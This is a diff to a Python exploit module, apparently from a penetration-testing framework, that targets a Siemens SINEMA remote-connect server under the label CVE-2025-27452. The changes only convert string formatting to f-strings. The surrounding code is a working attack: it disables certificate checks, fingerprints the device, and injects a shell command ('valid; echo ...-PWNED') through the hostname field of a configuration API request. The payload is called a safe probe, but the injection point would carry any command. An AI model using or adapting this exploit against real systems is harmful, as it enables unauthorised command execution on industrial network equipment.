@@ -54,7 +54,7 @@ class Exploit(Exploit):
             s = socket.create_connection((self.target, self.port), timeout=5)
             ss = ctx.wrap_socket(s, server_hostname=self.target)
             # Check for Siemens SINEMA banner
-            req = "HEAD / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n".format(self.target)
+            req = f"HEAD / HTTP/1.1\r\nHost: {self.target}\r\nConnection: close\r\n\r\n"
             ss.sendall(req.encode())
             resp = ss.recv(512)
             ss.close()
@@ -86,24 +86,24 @@ class Exploit(Exploit):
             print_info("Advisory: https://cert-portal.siemens.com/productcert/html/ssa-107778.html")
             return
 
-        print_status("[CVE-2025-27452] Targeting SINEMA at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2025-27452] Targeting SINEMA at {self.target}:{self.port} ...")
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
 
         # Command injection payload (safe probe: echo marker to response)
         INJECT_CMD = "valid; echo CVE-2025-27452-PWNED"
-        post_body = '{{"hostname": "{}", "port": 443}}'.format(INJECT_CMD)
+        post_body = f'{{"hostname": "{INJECT_CMD}", "port": 443}}'
 
         http_req = (
             "POST /api/v1/remote-connect/configure HTTP/1.1\r\n"
-            "Host: {}:{}\r\n"
+            f"Host: {self.target}:{self.port}\r\n"
             "Content-Type: application/json\r\n"
-            "Content-Length: {}\r\n"
+            f"Content-Length: {len(post_body)}\r\n"
             "Connection: close\r\n"
             "\r\n"
-            "{}"
-        ).format(self.target, self.port, len(post_body), post_body).encode()
+            f"{post_body}"
+        ).encode()
 
         try:
             s = socket.create_connection((self.target, self.port), timeout=10)
@@ -131,8 +131,8 @@ class Exploit(Exploit):
             elif "404" in resp_str:
                 print_warning("[CVE-2025-27452] 404 — endpoint path may differ, try /api/v2/")
             else:
-                print_info("[CVE-2025-27452] Response: {}...".format(resp_str[:200]))
+                print_info(f"[CVE-2025-27452] Response: {resp_str[:200]}...")
         except ConnectionRefusedError:
-            print_warning("[CVE-2025-27452] Connection refused on port {}".format(self.port))
+            print_warning(f"[CVE-2025-27452] Connection refused on port {self.port}")
         except Exception as exc:
-            print_error("[CVE-2025-27452] Error: {}".format(exc))
+            print_error(f"[CVE-2025-27452] Error: {exc}")
